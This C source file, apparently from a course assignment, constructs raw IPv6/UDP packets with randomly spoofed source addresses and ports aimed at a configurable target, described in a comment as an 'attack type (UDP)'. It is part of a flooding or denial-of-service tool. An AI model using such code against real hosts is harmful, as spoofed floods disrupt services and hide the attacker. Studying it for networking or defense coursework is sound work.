#include "packets.h"

void get_random_ip(char *ip_buffer)
{
	// Generate 8 different numbers from 0 to 15 in hexadecimal form:
	for (int i=0; i<32 ; i+=4)
	{
		if (i==0)
			sprintf(ip_buffer, "%x%x%x%x", rand()%16, rand()%16, rand()%16, rand()%16);
		else
			sprintf(ip_buffer+i, ":%x%x%x%x", rand()%16, rand()%16, rand()%16, rand()%16);
	}
}

void get_random_port(__u_int *port)
{
	*port = (rand() % 65535) + 1; //Gives a number between 1 and 65535
}

void create_packet(char *packet, struct packet_settings *settings)
{	
	// Set fake random source details:
	get_random_ip(settings->source_ip_address);
	get_random_port(&settings->source_port);
	
	// Initialize IPv6 header and set fields according to the attack type (UDP):
	struct ip6_hdr iph6;
	iph6.ip6_ctlun.ip6_un2_vfc = 6 ; //version
	iph6.ip6_ctlun.ip6_un1.ip6_un1_flow = htonl ((6 << 28) | (0 << 20) | 0); //4 bits version, 8 bits traffic class, 20 bits flow label
	iph6.ip6_ctlun.ip6_un1.ip6_un1_plen = sizeof(struct udphdr);
	iph6.ip6_ctlun.ip6_un1.ip6_un1_nxt = IPPROTO_UDP; // In our case - UDP
	iph6.ip6_ctlun.ip6_un1.ip6_un1_hlim = 255;

	inet_pton(AF_INET6, settings->target_ip_address, &(iph6.ip6_dst));
	inet_pton(AF_INET6, settings->source_ip_address, &(iph6.ip6_src));
	
	memcpy(packet, &iph6, sizeof(struct ip6_hdr)); // Copy the IP header to our packet buffer.

	// Create UDP header:
	create_udp_header(packet, settings);
}

void create_udp_header(char *packet, struct packet_settings *settings)
{
	// Initialize UDP header and set fields according to settings:
	struct udphdr udp;
	udp.uh_sport = htons(settings->source_port);
	udp.uh_dport = htons(settings->target_port);
	udp.uh_ulen = htons(sizeof(struct udphdr));
	udp.check = 0; // No need for checksum in IPv6 for current assignment

	memcpy(packet + sizeof(struct ip6_hdr), &udp, sizeof(struct udphdr)); // Copy UDP header to our packet.
}